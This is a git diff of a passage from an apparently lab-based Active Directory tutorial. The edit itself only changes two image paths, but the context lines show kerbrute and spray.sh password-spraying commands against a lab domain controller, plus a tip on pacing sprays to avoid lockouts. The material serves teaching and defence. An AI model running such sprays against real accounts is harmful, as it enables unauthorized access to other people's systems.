@@ -43,7 +43,7 @@ To spray a single password from our kali machine we will use kerbrute again. But
 ./kerbrute_linux_amd64 passwordspray -d amsterdam.bank.local --dc 10.0.0.3 ~/adlab/users.txt 'Welcome2022!'
 ```
 
-![](<../../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (11) (1).png>)
 
 {% hint style="warning" %}
 It is recommended to not spray more then one password every 30 minutes to prevent locking out accounts. We dont have access to the domain yet and can't retrieve the current passwordpolicy.
@@ -71,7 +71,7 @@ bash spray.sh smb 10.0.0.3 ~/adlab/users.txt ~/adlab/passwords.txt 1 31 password
 
 _For demonstration purposed we used 1 minute._
 
-![](<../../../.gitbook/assets/image (23).png>)
+![](<../../../.gitbook/assets/image (23) (1).png>)
 
 ## Defending
 
